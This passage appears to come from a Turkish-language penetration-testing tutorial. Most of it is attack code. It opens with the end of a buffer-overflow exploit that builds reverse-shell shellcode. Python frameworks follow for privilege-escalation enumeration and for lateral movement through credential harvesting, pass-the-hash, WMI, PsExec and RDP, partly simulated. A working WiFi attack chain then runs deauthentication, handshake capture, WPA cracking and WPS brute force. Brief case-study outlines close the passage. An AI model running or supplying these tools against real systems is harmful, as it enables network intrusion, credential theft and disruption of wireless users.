    # 4. K√∂t√º karakterleri ayarla
    exploit.set_bad_characters([0x00, 0x0a, 0x0d])
    
    # 5. JMP ESP adresi bul ve ayarla
    exploit.set_return_address(0x625011af)
    
    # 6. Shellcode olu≈ütur
    exploit.generate_shellcode('reverse_shell', '192.168.1.100', 4444)
    
    # 7. Exploit'i test et
    if exploit.test_exploit():
        print("[+] Test ba≈üarƒ±lƒ±!")
        
        # 8. Exploit'i √ßalƒ±≈ütƒ±r
        exploit.run_exploit()
    else:
        print("[-] Test ba≈üarƒ±sƒ±z!")
```

## üîê Post-Exploitation Teknikleri

### Privilege Escalation Framework

```python
#!/usr/bin/env python3
"""
Privilege Escalation Framework
Author: ibrahimsql
Description: Windows ve Linux privilege escalation teknikleri
"""

import subprocess
import os
import platform
import json
from datetime import datetime

class PrivilegeEscalationFramework:
    def __init__(self):
        self.os_type = platform.system().lower()
        self.escalation_results = []
        self.current_privileges = self.check_current_privileges()
    
    def check_current_privileges(self):
        """Mevcut yetkileri kontrol et"""
        privileges = {
            'user': os.getenv('USER') or os.getenv('USERNAME'),
            'uid': os.getuid() if hasattr(os, 'getuid') else 'N/A',
            'groups': [],
            'is_admin': False
        }
        
        if self.os_type == 'windows':
            try:
                result = subprocess.run(['whoami', '/groups'], capture_output=True, text=True)
                privileges['groups'] = result.stdout.split('\n')
                privileges['is_admin'] = 'Administrators' in result.stdout
            except:
                pass
        else:
            try:
                result = subprocess.run(['groups'], capture_output=True, text=True)
                privileges['groups'] = result.stdout.strip().split()
                privileges['is_admin'] = privileges['uid'] == 0
            except:
                pass
        
        return privileges
    
    def linux_privilege_escalation(self):
        """Linux privilege escalation teknikleri"""
        print("[+] Linux privilege escalation kontrolleri ba≈ülatƒ±lƒ±yor...")
        
        techniques = [
            self.check_sudo_misconfigurations,
            self.check_suid_binaries,
            self.check_kernel_exploits,
            self.check_cron_jobs,
            self.check_writable_files,
            self.check_environment_variables,
            self.check_network_services
        ]
        
        for technique in techniques:
            try:
                result = technique()
                if result:
                    self.escalation_results.append(result)
            except Exception as e:
                print(f"[-] Hata: {technique.__name__}: {e}")
    
    def check_sudo_misconfigurations(self):
        """Sudo yanlƒ±≈ü konfig√ºrasyonlarƒ±nƒ± kontrol et"""
        print("[*] Sudo konfig√ºrasyonlarƒ± kontrol ediliyor...")
        
        findings = []
        
        try:
            # sudo -l komutu
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True)
            if result.returncode == 0:
                sudo_rules = result.stdout
                
                # Tehlikeli sudo kurallarƒ±
                dangerous_patterns = [
                    'NOPASSWD',
                    '/bin/bash',
                    '/bin/sh',
                    'ALL=(ALL)',
                    'vim',
                    'nano',
                    'less',
                    'more'
                ]
                
                for pattern in dangerous_patterns:
                    if pattern in sudo_rules:
                        findings.append({
                            'type': 'sudo_misconfiguration',
                            'description': f'Tehlikeli sudo kuralƒ±: {pattern}',
                            'details': sudo_rules,
                            'severity': 'high'
                        })
        except:
            pass
        
        return findings
    
    def check_suid_binaries(self):
        """SUID binary'leri kontrol et"""
        print("[*] SUID binary'ler kontrol ediliyor...")
        
        findings = []
        
        try:
            # SUID binary'leri bul
            result = subprocess.run(
                ['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null'],
                capture_output=True, text=True, shell=True
            )
            
            suid_binaries = result.stdout.strip().split('\n')
            
            # Tehlikeli SUID binary'ler
            dangerous_suid = [
                'vim', 'nano', 'less', 'more', 'tail', 'head',
                'awk', 'sed', 'python', 'perl', 'ruby', 'php',
                'find', 'xargs', 'bash', 'sh', 'dash'
            ]
            
            for binary_path in suid_binaries:
                binary_name = os.path.basename(binary_path)
                if binary_name in dangerous_suid:
                    findings.append({
                        'type': 'dangerous_suid',
                        'description': f'Tehlikeli SUID binary: {binary_path}',
                        'binary': binary_path,
                        'severity': 'high'
                    })
        except:
            pass
        
        return findings
    
    def check_kernel_exploits(self):
        """Kernel exploit'larƒ±nƒ± kontrol et"""
        print("[*] Kernel versiyonu kontrol ediliyor...")
        
        findings = []
        
        try:
            # Kernel versiyonu
            result = subprocess.run(['uname', '-r'], capture_output=True, text=True)
            kernel_version = result.stdout.strip()
            
            # Bilinen zafiyet i√ßeren kernel versiyonlarƒ±
            vulnerable_kernels = {
                '2.6.': ['DirtyCow', 'Overlayfs'],
                '3.': ['DirtyCow', 'KASLR bypass'],
                '4.4.': ['DirtyCow'],
                '4.8.': ['af_packet']
            }
            
            for version_pattern, exploits in vulnerable_kernels.items():
                if version_pattern in kernel_version:
                    for exploit in exploits:
                        findings.append({
                            'type': 'kernel_vulnerability',
                            'description': f'Kernel {kernel_version} {exploit} zafiyetine sahip olabilir',
                            'kernel_version': kernel_version,
                            'exploit': exploit,
                            'severity': 'high'
                        })
        except:
            pass
        
        return findings
    
    def check_cron_jobs(self):
        """Cron job'larƒ± kontrol et"""
        print("[*] Cron job'lar kontrol ediliyor...")
        
        findings = []
        
        try:
            # Sistem cron job'larƒ±
            cron_dirs = ['/etc/cron.d/', '/etc/cron.daily/', '/etc/cron.hourly/', '/etc/cron.monthly/', '/etc/cron.weekly/']
            
            for cron_dir in cron_dirs:
                if os.path.exists(cron_dir):
                    for file in os.listdir(cron_dir):
                        file_path = os.path.join(cron_dir, file)
                        if os.access(file_path, os.W_OK):
                            findings.append({
                                'type': 'writable_cron',
                                'description': f'Yazƒ±labilir cron dosyasƒ±: {file_path}',
                                'file_path': file_path,
                                'severity': 'medium'
                            })
        except:
            pass
        
        return findings
    
    def windows_privilege_escalation(self):
        """Windows privilege escalation teknikleri"""
        print("[+] Windows privilege escalation kontrolleri ba≈ülatƒ±lƒ±yor...")
        
        techniques = [
            self.check_unquoted_service_paths,
            self.check_weak_service_permissions,
            self.check_registry_autoruns,
            self.check_dll_hijacking,
            self.check_token_privileges
        ]
        
        for technique in techniques:
            try:
                result = technique()
                if result:
                    self.escalation_results.append(result)
            except Exception as e:
                print(f"[-] Hata: {technique.__name__}: {e}")
    
    def check_unquoted_service_paths(self):
        """Unquoted service path'leri kontrol et"""
        print("[*] Unquoted service path'ler kontrol ediliyor...")
        
        findings = []
        
        try:
            # Servis listesi al
            result = subprocess.run(
                ['wmic', 'service', 'get', 'name,displayname,pathname,startmode'],
                capture_output=True, text=True
            )
            
            lines = result.stdout.split('\n')
            for line in lines:
                if 'C:\\' in line and '"' not in line and '.exe' in line:
                    # Unquoted path bulundu
                    findings.append({
                        'type': 'unquoted_service_path',
                        'description': f'Unquoted service path: {line.strip()}',
                        'service_info': line.strip(),
                        'severity': 'medium'
                    })
        except:
            pass
        
        return findings
    
    def check_weak_service_permissions(self):
        """Zayƒ±f servis izinlerini kontrol et"""
        print("[*] Servis izinleri kontrol ediliyor...")
        
        findings = []
        
        try:
            # Accesschk ile servis izinlerini kontrol et
            result = subprocess.run(
                ['accesschk.exe', '-uwcqv', 'Everyone', '*'],
                capture_output=True, text=True
            )
            
            if 'SERVICE_CHANGE_CONFIG' in result.stdout or 'SERVICE_ALL_ACCESS' in result.stdout:
                findings.append({
                    'type': 'weak_service_permissions',
                    'description': 'Zayƒ±f servis izinleri bulundu',
                    'details': result.stdout,
                    'severity': 'high'
                })
        except:
            pass
        
        return findings
    
    def run_escalation_check(self):
        """Privilege escalation kontrollerini √ßalƒ±≈ütƒ±r"""
        print(f"[+] {self.os_type.title()} privilege escalation kontrolleri ba≈ülatƒ±lƒ±yor...")
        
        if self.os_type == 'linux':
            self.linux_privilege_escalation()
        elif self.os_type == 'windows':
            self.windows_privilege_escalation()
        else:
            print(f"[-] Desteklenmeyen i≈ületim sistemi: {self.os_type}")
        
        return self.escalation_results
    
    def generate_report(self):
        """Privilege escalation raporu olu≈ütur"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'os_type': self.os_type,
            'current_privileges': self.current_privileges,
            'findings': self.escalation_results,
            'summary': {
                'total_findings': len(self.escalation_results),
                'high_severity': len([f for f in self.escalation_results if any(item.get('severity') == 'high' for item in f)]),
                'medium_severity': len([f for f in self.escalation_results if any(item.get('severity') == 'medium' for item in f)])
            }
        }
        
        report_file = f'privesc_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Privilege escalation raporu olu≈üturuldu: {report_file}")
        return report_file

# Kullanƒ±m √∂rneƒüi
if __name__ == "__main__":
    privesc = PrivilegeEscalationFramework()
    
    # Privilege escalation kontrollerini √ßalƒ±≈ütƒ±r
    findings = privesc.run_escalation_check()
    
    # Sonu√ßlarƒ± g√∂ster
    for finding_group in findings:
        for finding in finding_group:
            print(f"[!] {finding['type']}: {finding['description']}")
    
    # Rapor olu≈ütur
    privesc.generate_report()
```

### Lateral Movement Teknikleri

```python
#!/usr/bin/env python3
"""
Lateral Movement Framework
Author: ibrahimsql
Description: Aƒü i√ßinde lateral movement teknikleri
"""

import subprocess
import socket
import threading
import time
from datetime import datetime
import json

class LateralMovementFramework:
    def __init__(self):
        self.compromised_hosts = []
        self.credentials = []
        self.network_map = {}
        self.movement_log = []
    
    def add_compromised_host(self, host_ip, access_method, credentials=None):
        """Compromised host ekle"""
        host_info = {
            'ip': host_ip,
            'access_method': access_method,
            'credentials': credentials,
            'timestamp': datetime.now().isoformat(),
            'services': [],
            'shares': [],
            'users': []
        }
        
        self.compromised_hosts.append(host_info)
        print(f"[+] Compromised host eklendi: {host_ip}")
    
    def credential_harvesting(self, host_ip):
        """Credential harvesting"""
        print(f"[+] {host_ip} √ºzerinde credential harvesting...")
        
        harvested_creds = []
        
        # Mimikatz benzeri credential extraction
        techniques = [
            self.extract_lsass_credentials,
            self.extract_registry_credentials,
            self.extract_browser_credentials,
            self.extract_wifi_credentials
        ]
        
        for technique in techniques:
            try:
                creds = technique(host_ip)
                harvested_creds.extend(creds)
            except Exception as e:
                print(f"[-] Credential harvesting hatasƒ±: {e}")
        
        self.credentials.extend(harvested_creds)
        return harvested_creds
    
    def extract_lsass_credentials(self, host_ip):
        """LSASS'dan credential'larƒ± √ßƒ±kar"""
        print(f"[*] LSASS credential extraction: {host_ip}")
        
        # Simulated credential extraction
        credentials = [
            {'type': 'ntlm', 'username': 'admin', 'hash': 'aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76'},
            {'type': 'plaintext', 'username': 'user1', 'password': 'Password123'},
            {'type': 'kerberos', 'username': 'service_account', 'ticket': 'base64_encoded_ticket'}
        ]
        
        return credentials
    
    def pass_the_hash(self, target_ip, username, ntlm_hash):
        """Pass-the-Hash saldƒ±rƒ±sƒ±"""
        print(f"[+] Pass-the-Hash saldƒ±rƒ±sƒ±: {username}@{target_ip}")
        
        try:
            # Simulated PTH attack
            print(f"[*] NTLM hash kullanƒ±lƒ±yor: {ntlm_hash}")
            
            # SMB baƒülantƒ±sƒ± kur
            success = self.smb_connect_with_hash(target_ip, username, ntlm_hash)
            
            if success:
                self.add_compromised_host(target_ip, 'pass_the_hash', {'username': username, 'hash': ntlm_hash})
                self.movement_log.append({
                    'technique': 'pass_the_hash',
                    'source': 'current_host',
                    'target': target_ip,
                    'username': username,
                    'timestamp': datetime.now().isoformat(),
                    'success': True
                })
                return True
            
        except Exception as e:
            print(f"[-] Pass-the-Hash hatasƒ±: {e}")
            self.movement_log.append({
                'technique': 'pass_the_hash',
                'target': target_ip,
                'error': str(e),
                'timestamp': datetime.now().isoformat(),
                'success': False
            })
        
        return False
    
    def smb_connect_with_hash(self, target_ip, username, ntlm_hash):
        """SMB baƒülantƒ±sƒ± NTLM hash ile"""
        try:
            # Simulated SMB connection with hash
            print(f"[*] SMB baƒülantƒ±sƒ± kuruluyor: {target_ip}")
            time.sleep(1)  # Simulate connection time
            
            # Check if target is reachable
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target_ip, 445))
            sock.close()
            
            if result == 0:
                print(f"[+] SMB baƒülantƒ±sƒ± ba≈üarƒ±lƒ±: {target_ip}")
                return True
            else:
                print(f"[-] SMB baƒülantƒ±sƒ± ba≈üarƒ±sƒ±z: {target_ip}")
                return False
                
        except Exception as e:
            print(f"[-] SMB baƒülantƒ± hatasƒ±: {e}")
            return False
    
    def wmi_lateral_movement(self, target_ip, username, password):
        """WMI ile lateral movement"""
        print(f"[+] WMI lateral movement: {target_ip}")
        
        try:
            # WMI command execution
            command = "powershell.exe -enc <base64_encoded_payload>"
            
            # Simulated WMI execution
            print(f"[*] WMI komutu √ßalƒ±≈ütƒ±rƒ±lƒ±yor: {command[:50]}...")
            
            success = self.execute_wmi_command(target_ip, username, password, command)
            
            if success:
                self.add_compromised_host(target_ip, 'wmi', {'username': username, 'password': password})
                self.movement_log.append({
                    'technique': 'wmi',
                    'target': target_ip,
                    'command': command,
                    'timestamp': datetime.now().isoformat(),
                    'success': True
                })
                return True
                
        except Exception as e:
            print(f"[-] WMI lateral movement hatasƒ±: {e}")
        
        return False
    
    def execute_wmi_command(self, target_ip, username, password, command):
        """WMI komutu √ßalƒ±≈ütƒ±r"""
        try:
            # Simulated WMI command execution
            print(f"[*] WMI komut √ßalƒ±≈ütƒ±rma: {target_ip}")
            time.sleep(2)  # Simulate execution time
            return True
        except:
            return False
    
    def psexec_lateral_movement(self, target_ip, username, password):
        """PsExec ile lateral movement"""
        print(f"[+] PsExec lateral movement: {target_ip}")
        
        try:
            # PsExec benzeri service installation
            service_name = "RemoteExec"
            service_binary = "C:\\Windows\\System32\\cmd.exe"
            
            # Service olu≈ütur ve ba≈ülat
            success = self.create_remote_service(target_ip, username, password, service_name, service_binary)
            
            if success:
                self.add_compromised_host(target_ip, 'psexec', {'username': username, 'password': password})
                self.movement_log.append({
                    'technique': 'psexec',
                    'target': target_ip,
                    'service': service_name,
                    'timestamp': datetime.now().isoformat(),
                    'success': True
                })
                return True
                
        except Exception as e:
            print(f"[-] PsExec lateral movement hatasƒ±: {e}")
        
        return False
    
    def create_remote_service(self, target_ip, username, password, service_name, binary_path):
        """Uzak sistemde service olu≈ütur"""
        try:
            # Simulated remote service creation
            print(f"[*] Remote service olu≈üturuluyor: {service_name}")
            time.sleep(1)
            return True
        except:
            return False
    
    def rdp_lateral_movement(self, target_ip, username, password):
        """RDP ile lateral movement"""
        print(f"[+] RDP lateral movement: {target_ip}")
        
        try:
            # RDP baƒülantƒ±sƒ± test et
            if self.test_rdp_connection(target_ip, username, password):
                self.add_compromised_host(target_ip, 'rdp', {'username': username, 'password': password})
                self.movement_log.append({
                    'technique': 'rdp',
                    'target': target_ip,
                    'timestamp': datetime.now().isoformat(),
                    'success': True
                })
                return True
                
        except Exception as e:
            print(f"[-] RDP lateral movement hatasƒ±: {e}")
        
        return False
    
    def test_rdp_connection(self, target_ip, username, password):
        """RDP baƒülantƒ±sƒ±nƒ± test et"""
        try:
            # RDP port kontrol√º
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target_ip, 3389))
            sock.close()
            
            if result == 0:
                print(f"[+] RDP portu a√ßƒ±k: {target_ip}")
                # Simulated credential validation
                return True
            else:
                print(f"[-] RDP portu kapalƒ±: {target_ip}")
                return False
                
        except Exception as e:
            print(f"[-] RDP test hatasƒ±: {e}")
            return False
    
    def discover_network_hosts(self, network_range):
        """Aƒüdaki hostlarƒ± ke≈üfet"""
        print(f"[+] Aƒü ke≈üfi ba≈ülatƒ±lƒ±yor: {network_range}")
        
        # Simulated network discovery
        discovered_hosts = [
            {'ip': '192.168.1.10', 'os': 'Windows', 'services': [135, 139, 445, 3389]},
            {'ip': '192.168.1.11', 'os': 'Windows', 'services': [135, 139, 445]},
            {'ip': '192.168.1.20', 'os': 'Linux', 'services': [22, 80, 443]}
        ]
        
        self.network_map[network_range] = discovered_hosts
        return discovered_hosts
    
    def automated_lateral_movement(self, network_range):
        """Otomatik lateral movement"""
        print(f"[+] Otomatik lateral movement ba≈ülatƒ±lƒ±yor: {network_range}")
        
        # Aƒüƒ± ke≈üfet
        hosts = self.discover_network_hosts(network_range)
        
        # Her host i√ßin lateral movement dene
        for host in hosts:
            target_ip = host['ip']
            
            # Mevcut credential'larƒ± dene
            for cred in self.credentials:
                if cred['type'] == 'plaintext':
                    # Plaintext credential ile dene
                    techniques = [
                        lambda: self.wmi_lateral_movement(target_ip, cred['username'], cred['password']),
                        lambda: self.psexec_lateral_movement(target_ip, cred['username'], cred['password']),
                        lambda: self.rdp_lateral_movement(target_ip, cred['username'], cred['password'])
                    ]
                    
                    for technique in techniques:
                        if technique():
                            print(f"[+] Lateral movement ba≈üarƒ±lƒ±: {target_ip}")
                            break
                
                elif cred['type'] == 'ntlm':
                    # NTLM hash ile dene
                    if self.pass_the_hash(target_ip, cred['username'], cred['hash']):
                        print(f"[+] Pass-the-Hash ba≈üarƒ±lƒ±: {target_ip}")
    
    def generate_movement_report(self):
        """Lateral movement raporu olu≈ütur"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'compromised_hosts': self.compromised_hosts,
            'credentials_harvested': len(self.credentials),
            'movement_attempts': self.movement_log,
            'network_map': self.network_map,
            'summary': {
                'total_compromised': len(self.compromised_hosts),
                'successful_movements': len([log for log in self.movement_log if log.get('success')]),
                'failed_movements': len([log for log in self.movement_log if not log.get('success')])
            }
        }
        
        report_file = f'lateral_movement_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Lateral movement raporu olu≈üturuldu: {report_file}")
        return report_file

# Kullanƒ±m √∂rneƒüi
if __name__ == "__main__":
    # Lateral movement framework ba≈ülat
    lateral = LateralMovementFramework()
    
    # ƒ∞lk compromised host ekle
    lateral.add_compromised_host('192.168.1.5', 'initial_access')
    
    # Credential harvesting
    creds = lateral.credential_harvesting('192.168.1.5')
    
    # Otomatik lateral movement
    lateral.automated_lateral_movement('192.168.1.0/24')
    
    # Rapor olu≈ütur
    lateral.generate_movement_report()
```

## üåê Wireless Network Penetration

### WiFi Penetration Testing Framework

```python
#!/usr/bin/env python3
"""
WiFi Penetration Testing Framework
Author: ibrahimsql
Description: Wireless network penetration testing ara√ßlarƒ±
"""

import subprocess
import re
import time
import json
from datetime import datetime
import threading

class WiFiPentestFramework:
    def __init__(self, interface='wlan0'):
        self.interface = interface
        self.monitor_interface = f"{interface}mon"
        self.discovered_networks = []
        self.captured_handshakes = []
        self.cracked_passwords = []
    
    def enable_monitor_mode(self):
        """Monitor mode'u etkinle≈ütir"""
        print(f"[+] {self.interface} i√ßin monitor mode etkinle≈ütiriliyor...")
        
        try:
            # Interface'i down et
            subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], check=True)
            
            # Monitor mode'a ge√ß
            subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'monitor'], check=True)
            
            # Interface'i up et
            subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], check=True)
            
            print(f"[+] Monitor mode etkinle≈ütirildi: {self.interface}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[-] Monitor mode hatasƒ±: {e}")
            return False
    
    def disable_monitor_mode(self):
        """Monitor mode'u devre dƒ±≈üƒ± bƒ±rak"""
        print(f"[+] {self.interface} i√ßin monitor mode devre dƒ±≈üƒ± bƒ±rakƒ±lƒ±yor...")
        
        try:
            # Interface'i down et
            subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], check=True)
            
            # Managed mode'a ge√ß
            subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'managed'], check=True)
            
            # Interface'i up et
            subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], check=True)
            
            print(f"[+] Monitor mode devre dƒ±≈üƒ± bƒ±rakƒ±ldƒ±: {self.interface}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[-] Monitor mode devre dƒ±≈üƒ± bƒ±rakma hatasƒ±: {e}")
            return False
    
    def scan_networks(self, duration=60):
        """WiFi aƒülarƒ±nƒ± tara"""
        print(f"[+] WiFi aƒülarƒ± taranƒ±yor ({duration} saniye)...")
        
        try:
            # airodump-ng ile tarama
            cmd = [
                'sudo', 'airodump-ng',
                '--write', 'wifi_scan',
                '--output-format', 'csv',
                self.interface
            ]
            
            # Tarama i≈ülemini ba≈ülat
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Belirtilen s√ºre kadar bekle
            time.sleep(duration)
            
            # ƒ∞≈ülemi sonlandƒ±r
            process.terminate()
            
            # Sonu√ßlarƒ± parse et
            self.parse_airodump_results('wifi_scan-01.csv')
            
            print(f"[+] {len(self.discovered_networks)} WiFi aƒüƒ± bulundu")
            return self.discovered_networks
            
        except Exception as e:
            print(f"[-] WiFi tarama hatasƒ±: {e}")
            return []
    
    def parse_airodump_results(self, csv_file):
        """Airodump-ng sonu√ßlarƒ±nƒ± parse et"""
        try:
            with open(csv_file, 'r') as f:
                content = f.read()
            
            # CSV i√ßeriƒüini parse et
            lines = content.split('\n')
            
            for line in lines:
                if line and not line.startswith('BSSID'):
                    parts = line.split(', ')
                    if len(parts) >= 14:
                        network = {
                            'bssid': parts[0].strip(),
                            'first_seen': parts[1].strip(),
                            'last_seen': parts[2].strip(),
                            'channel': parts[3].strip(),
                            'speed': parts[4].strip(),
                            'privacy': parts[5].strip(),
                            'cipher': parts[6].strip(),
                            'authentication': parts[7].strip(),
                            'power': parts[8].strip(),
                            'beacons': parts[9].strip(),
                            'iv': parts[10].strip(),
                            'lan_ip': parts[11].strip(),
                            'id_length': parts[12].strip(),
                            'essid': parts[13].strip(),
                            'key': parts[14].strip() if len(parts) > 14 else ''
                        }
                        
                        if network['essid'] and network['essid'] != ' ':
                            self.discovered_networks.append(network)
        
        except Exception as e:
            print(f"[-] CSV parse hatasƒ±: {e}")
    
    def capture_handshake(self, target_bssid, target_channel, duration=300):
        """WPA handshake yakala"""
        print(f"[+] {target_bssid} i√ßin handshake yakalanƒ±yor...")
        
        try:
            # Kanala ge√ß
            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(target_channel)], check=True)
            
            # Handshake yakalama
            cmd = [
                'sudo', 'airodump-ng',
                '--bssid', target_bssid,
                '--channel', str(target_channel),
                '--write', f'handshake_{target_bssid.replace(":", "")}',
                self.interface
            ]
            
            # Yakalama i≈ülemini ba≈ülat
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Deauth saldƒ±rƒ±sƒ± ile handshake zorla
            self.deauth_attack(target_bssid)
            
            # Handshake yakalanana kadar bekle
            time.sleep(duration)
            
            # ƒ∞≈ülemi sonlandƒ±r
            process.terminate()
            
            # Handshake kontrol√º
            cap_file = f'handshake_{target_bssid.replace(":", "")}-01.cap'
            if self.verify_handshake(cap_file, target_bssid):
                self.captured_handshakes.append({
                    'bssid': target_bssid,
                    'channel': target_channel,
                    'cap_file': cap_file,
                    'timestamp': datetime.now().isoformat()
                })
                print(f"[+] Handshake yakalandƒ±: {target_bssid}")
                return True
            else:
                print(f"[-] Handshake yakalanamadƒ±: {target_bssid}")
                return False
                
        except Exception as e:
            print(f"[-] Handshake yakalama hatasƒ±: {e}")
            return False
    
    def deauth_attack(self, target_bssid, client_mac=None, count=10):
        """Deauthentication saldƒ±rƒ±sƒ±"""
        print(f"[+] Deauth saldƒ±rƒ±sƒ± ba≈ülatƒ±lƒ±yor: {target_bssid}")
        
        try:
            if client_mac:
                # Belirli client'a deauth
                cmd = [
                    'sudo', 'aireplay-ng',
                    '--deauth', str(count),
                    '-a', target_bssid,
                    '-c', client_mac,
                    self.interface
                ]
            else:
                # T√ºm client'lara deauth
                cmd = [
                    'sudo', 'aireplay-ng',
                    '--deauth', str(count),
                    '-a', target_bssid,
                    self.interface
                ]
            
            subprocess.run(cmd, check=True)
            print(f"[+] Deauth saldƒ±rƒ±sƒ± tamamlandƒ±: {target_bssid}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[-] Deauth saldƒ±rƒ±sƒ± hatasƒ±: {e}")
            return False
    
    def verify_handshake(self, cap_file, bssid):
        """Handshake'in yakalandƒ±ƒüƒ±nƒ± doƒürula"""
        try:
            # aircrack-ng ile handshake kontrol√º
            result = subprocess.run(
                ['aircrack-ng', cap_file],
                capture_output=True, text=True
            )
            
            # Handshake var mƒ± kontrol et
            if 'handshake' in result.stdout.lower() and bssid in result.stdout:
                return True
            else:
                return False
                
        except Exception as e:
            print(f"[-] Handshake doƒürulama hatasƒ±: {e}")
            return False
    
    def crack_wpa_password(self, cap_file, bssid, wordlist_path):
        """WPA ≈üifresini kƒ±rma"""
        print(f"[+] WPA ≈üifresi kƒ±rƒ±lƒ±yor: {bssid}")
        
        try:
            # aircrack-ng ile ≈üifre kƒ±rma
            cmd = [
                'aircrack-ng',
                '-b', bssid,
                '-w', wordlist_path,
                cap_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            # ≈ûifre bulundu mu kontrol et
            if 'KEY FOUND!' in result.stdout:
                # ≈ûifreyi √ßƒ±kar
                password_match = re.search(r'\[ (.+) \]', result.stdout)
                if password_match:
                    password = password_match.group(1)
                    
                    self.cracked_passwords.append({
                        'bssid': bssid,
                        'password': password,
                        'timestamp': datetime.now().isoformat()
                    })
                    
                    print(f"[+] ≈ûifre bulundu: {bssid} -> {password}")
                    return password
            
            print(f"[-] ≈ûifre bulunamadƒ±: {bssid}")
            return None
            
        except subprocess.TimeoutExpired:
            print(f"[-] ≈ûifre kƒ±rma zaman a≈üƒ±mƒ±: {bssid}")
            return None
        except Exception as e:
            print(f"[-] ≈ûifre kƒ±rma hatasƒ±: {e}")
            return None
    
    def wps_attack(self, target_bssid, target_channel):
        """WPS PIN saldƒ±rƒ±sƒ±"""
        print(f"[+] WPS saldƒ±rƒ±sƒ± ba≈ülatƒ±lƒ±yor: {target_bssid}")
        
        try:
            # Kanala ge√ß
            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(target_channel)], check=True)
            
            # Reaver ile WPS saldƒ±rƒ±sƒ±
            cmd = [
                'sudo', 'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(target_channel),
                '-vv'
            ]
            
            # WPS saldƒ±rƒ±sƒ±nƒ± ba≈ülat (arka planda)
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            print(f"[+] WPS saldƒ±rƒ±sƒ± ba≈ülatƒ±ldƒ±: {target_bssid}")
            print("[*] Bu i≈ülem saatler s√ºrebilir...")
            
            return process
            
        except Exception as e:
            print(f"[-] WPS saldƒ±rƒ±sƒ± hatasƒ±: {e}")
            return None
    
    def generate_wifi_report(self):
        """WiFi penetration test raporu olu≈ütur"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'interface': self.interface,
            'discovered_networks': self.discovered_networks,
            'captured_handshakes': self.captured_handshakes,
            'cracked_passwords': self.cracked_passwords,
            'summary': {
                'total_networks': len(self.discovered_networks),
                'handshakes_captured': len(self.captured_handshakes),
                'passwords_cracked': len(self.cracked_passwords),
                'success_rate': len(self.cracked_passwords) / len(self.captured_handshakes) if self.captured_handshakes else 0
            }
        }
        
        report_file = f'wifi_pentest_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] WiFi penetration test raporu olu≈üturuldu: {report_file}")
        return report_file

# Kullanƒ±m √∂rneƒüi
if __name__ == "__main__":
    # WiFi pentest framework ba≈ülat
    wifi_pentest = WiFiPentestFramework('wlan0')
    
    # Monitor mode etkinle≈ütir
    if wifi_pentest.enable_monitor_mode():
        try:
            # Aƒülarƒ± tara
            networks = wifi_pentest.scan_networks(60)
            
            # WPA aƒülarƒ± i√ßin handshake yakala
            for network in networks:
                if 'WPA' in network.get('privacy', ''):
                    bssid = network['bssid']
                    channel = int(network['channel'])
                    
                    # Handshake yakala
                    if wifi_pentest.capture_handshake(bssid, channel, 120):
                        # ≈ûifre kƒ±rma dene
                        cap_file = f'handshake_{bssid.replace(":", "")}-01.cap'
                        password = wifi_pentest.crack_wpa_password(
                            cap_file, bssid, '/usr/share/wordlists/rockyou.txt'
                        )
            
            # Rapor olu≈ütur
            wifi_pentest.generate_wifi_report()
            
        finally:
            # Monitor mode'u devre dƒ±≈üƒ± bƒ±rak
            wifi_pentest.disable_monitor_mode()
    else:
        print("[-] Monitor mode etkinle≈ütirilemedi!")
```

## üìä Ger√ßek D√ºnya Vaka √áalƒ±≈ümalarƒ±

### Vaka 1: Kurumsal Aƒü Penetrasyon Testi

**Senaryo**: B√ºy√ºk bir ≈üirketin i√ß aƒüƒ±nda penetrasyon testi

**Hedefler**:
- Aƒü segmentasyonu zafiyetlerini tespit etme
- Privilege escalation fƒ±rsatlarƒ±nƒ± bulma
- Lateral movement imkanlarƒ±nƒ± deƒüerlendirme

**Kullanƒ±lan Teknikler**:
- Nmap ile aƒü ke≈üfi
- SMB enumeration
- Kerberoasting saldƒ±rƒ±sƒ±
- Pass-the-Hash teknikleri

### Vaka 2: DMZ Penetrasyon Testi

**Senaryo**: Web sunucularƒ±nƒ±n bulunduƒüu DMZ b√∂lgesinin test edilmesi

**Hedefler**:
- Firewall bypass teknikleri
- Web sunucu zafiyetleri
- Database eri≈üimi

**Kullanƒ±lan Teknikler**:
- Port knocking
- HTTP tunneling
- SQL injection
- Privilege escalation

### Vaka 3: Wireless Network Penetrasyon

**Senaryo**: Kurumsal WiFi aƒüƒ±nƒ±n g√ºvenlik deƒüerlendirmesi

**Hedefler**:
- WPA2/WPA3 g√ºvenlik kontrol√º
- Rogue access point tespiti
- Client isolation testleri

**Kullanƒ±lan Teknikler**:
- WPS PIN saldƒ±rƒ±sƒ±
